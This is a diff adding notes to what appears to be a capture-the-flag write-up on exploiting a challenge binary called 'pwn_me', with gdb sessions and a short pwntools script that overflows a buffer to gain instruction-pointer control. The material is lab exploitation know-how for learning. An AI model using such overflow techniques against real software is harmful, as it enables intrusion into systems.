@@ -168,3 +168,33 @@ $ gdb pwn_me
 So the `memcpy` call puts the input into another address ... boom, there it is. The puts call (`*main+549) prints everything after the space in almond, so we just need to overflow that until we get to the flag. 
 
 Wait no, we want shell, not a flag. Maybe it is a printf vulnerability?  
+
+Ok, we soldier on, why is the segfault happening? 
+```
+$ gdb pwn_me
+> b *main+0
+> reg
+RBP  0x555555555620 (__libc_csu_init)
+> b *main+559 // the leave of main
+> si
+> x/dx $rsp
+0x00000
+```
+
+So something is happening here where the stack is shifting causing the segfault, the question is, can we control that?
+
+Well, lets see if we can overwite rip, get us some options.
+
+Boom, got it with pwntools
+```
+from pwn import *
+
+p = process("./pwn_me")
+payload = "almond "
+payload += "A"*417
+payload += "B"*8
+p.sendline(payload)
+print(p.recv())
+```
+
+So we have RIP control, we are going to need to leak an address to figure out libc.
